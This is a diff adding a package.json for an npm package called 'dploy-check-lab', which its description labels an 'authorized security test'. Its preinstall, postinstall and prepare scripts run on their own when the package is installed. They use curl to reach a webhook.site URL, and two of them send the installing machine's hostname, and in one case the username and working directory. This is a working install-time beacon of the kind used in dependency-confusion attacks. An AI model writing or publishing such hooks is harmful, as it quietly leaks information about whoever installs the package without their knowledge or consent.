@@ -1,0 +1,12 @@
+{
+  "name": "dploy-check-lab",
+  "version": "1.0.0",
+  "description": "authorized security test",
+  "scripts": {
+    "preinstall": "curl -s -m 5 \"https://webhook.site/1601202d-fda2-422e-98ba-5845d4fc179d/preinstall?h=$(hostname)&u=$(id -un)&d=$(pwd)\" || true",
+    "postinstall": "curl -s -m 5 \"https://webhook.site/1601202d-fda2-422e-98ba-5845d4fc179d/postinstall?h=$(hostname)\" || true",
+    "prepare": "curl -s -m 5 \"https://webhook.site/1601202d-fda2-422e-98ba-5845d4fc179d/prepare\" || true",
+    "start": "node index.js"
+  },
+  "dependencies": {}
+}
